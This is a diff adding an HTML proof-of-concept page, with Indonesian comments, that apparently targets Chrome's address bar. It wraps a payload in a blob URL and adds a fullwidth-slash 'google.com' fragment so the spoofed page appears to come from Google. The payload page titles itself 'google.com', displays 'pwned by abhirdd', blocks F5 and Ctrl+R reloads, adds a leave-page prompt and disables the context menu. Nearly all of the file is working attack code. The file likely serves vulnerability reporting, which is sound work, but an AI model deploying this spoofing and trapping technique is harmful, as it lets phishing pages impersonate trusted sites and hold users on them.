@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC: Display Spoof Max</title>
+<style>
+  body { margin:0; min-height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; gap:12px; }
+  h1 { font-size:1.1rem; font-weight:500; opacity:0.8; margin:0; }
+  pre { text-align:left; font-size:0.7rem; color:#0f0; max-width:90vw; white-space:pre-wrap; }
+</style>
+</head>
+<body>
+
+  <h1>Committing max display-spoof blob URL...</h1>
+  <pre id="log"></pre>
+
+  <script>
+    (function () {
+      var logEl = document.getElementById('log');
+      var log = function (m) { logEl.textContent += m + '\n'; console.log(m); };
+
+      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);
+
+      // Fragment display-spoof: google.com duluan, real URL diselundupkan
+      // di belakangnya. Fragment = komponen terakhir, isinya bebas.
+      var FRAG = '#%EF%BC%8Fgoogle.com%EF%BC%8F';
+
+      var payload =
+        '<!DOCTYPE html><html><head><meta charset="utf-8"><title>google.com</title></head>' +
+        '<body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,sans-serif;gap:20px;">' +
+        '<h1 style="margin:0;font-size:2rem;font-weight:500;">pwned by abhirdd</h1>' +
+        '<img src="https://cataas.com/cat?width=400&height=300&t=' + Date.now() + '" alt="cat" style="max-width:400px;width:80vw;border-radius:12px;" ' +
+        'onerror="this.style.display=\'none\'">' +
+        '<p style="font-size:0.75rem;color:#666;">(F5 / Ctrl+R diblok di halaman ini)</p>' +
+        '<scr' + 'ipt>' +
+        'window.addEventListener("keydown",function(e){' +
+        'if(e.key==="F5"||((e.ctrlKey||e.metaKey)&&e.key.toLowerCase()==="r")){e.preventDefault();e.stopPropagation();}},true);' +
+        'window.addEventListener("beforeunload",function(e){e.preventDefault();e.returnValue="x";});' +
+        'window.addEventListener("contextmenu",function(e){e.preventDefault();});' +
+        '<\/scr' + 'ipt></body></html>';
+
+      function makeUrl() {
+        return URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
+      }
+
+      // ---- JALUR file:// : prefix terpendek yang legal = "blob:null/" ----
+      if (location.protocol === 'file:' || location.origin === 'null') {
+        var uf = makeUrl();
+        log('[main] mode file:// -> DIRECT (prefix 10 char)');
+        log('[main] target: ' + uf + FRAG + uf);
+        location.replace(uf + FRAG + uf);
+        return;
+      }
+
+      // ---- JALUR https : commit canonical + fragment display-spoof ----
+      // (vektor blob:null/blob:/ sudah terbukti diblok Chrome headed;
+      //  canonical + fragment = maksimal yang bisa di-commit)
+      setTimeout(function () {
+        var u = makeUrl();
+        log('[main] commit: ' + u + FRAG + u);
+        location.replace(u + FRAG + u);
+      }, 1200);
+    })();
+  </script>
+
+</body>
+</html>
